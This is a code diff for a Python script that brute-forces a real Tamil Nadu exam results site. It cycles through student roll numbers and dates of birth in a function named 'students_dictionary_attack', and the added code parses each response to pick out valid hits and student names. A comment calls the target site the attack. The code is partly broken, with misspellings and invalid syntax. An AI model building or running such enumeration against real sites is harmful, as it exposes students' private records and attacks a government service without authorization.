@@ -2,6 +2,20 @@ from requests import post
 from bs4 import BeautifulSoup 
 from datetime import datatime,timedelta
 
+def process_package(package):
+    size = str(len(package.content)/1008)[0:4]
+    status = package.status_code
+    content = BeautifulSoup(package.text, 'html.parser').find('div',{'data-role' : 'content'}).text
+    name = str( ' ' + content.splitlines()[6] +') ')
+    
+    if 50>= len(content):
+        return { 'valid': False, 'content': content, 'size': size, 'status': status, 'name': name}
+    else:
+        return { 'valid': True, 'content': content, 'size': size, 'status': status, 'name': name}
+
+def result_screen(Details : dict):
+    pass
+
 def connection_send_package(roll_no, date_of_brith):
     url = 'https://tnresults.nic.in/wrfexrcd.asp' # CHECK URLPATH TO CORRECT SITE AATTACK
     header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, image/avif, image/webp,image/apng,*/*;q=0.8,application/signed-exchange; v=b3;q=0.7' ,
@@ -42,6 +56,10 @@ def students_dictionary_attack( collaction_of_roll_no, collaction_of_date_of_bri
             total_count_of_squence_over_student += 1
             
             package = connection_send_package( studentID, date_of_brith)
+            result = process_package(package)
+            
+            result_screen( (total_number_of_Id) )
+            
 
 if __name__ = '__main__':
     pass
